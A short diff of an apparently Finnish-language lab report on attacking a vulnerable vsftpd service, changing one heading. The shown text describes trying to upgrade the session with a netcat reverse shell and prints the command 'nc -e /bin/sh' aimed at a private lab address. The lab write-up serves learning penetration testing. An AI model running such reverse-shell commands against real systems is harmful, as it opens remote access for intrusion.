@@ -138,7 +138,7 @@ Tämän jälkeen hyökkäsin palveluun exploit komennolla. Kun shell yhteys on s
 
 ![Alt text](/H3LabKid/h3.f3.png)
 
-## g) Parempi sessio. Tee vsftpd-hyökkäyksestä saadusta sessiosta parempi. (Voit esimerkiksi päivittää sen meterpreter-sessioksi, laittaa tty:n toimimaan tai tehdä uuden käyttäjän ja ottaa yhteyden jollain tavallisella protokollalla)
+## g) Parempi sessio
 Ensiksi yritin käyttään lähteen 6 netcat:ia saadakseni reverse shellin aikaan, mutta se ei toiminut ja lähteen mukaan tähän voi olla kaksi syytä. 1 netcat ei ole asennettu tukeudutulle palvelimelle tai 2 kaikissa netcat versioissa ei ole -e valintaa olemassa. 
 
     $ nc -e /bin/sh 192.168.56.101 4444
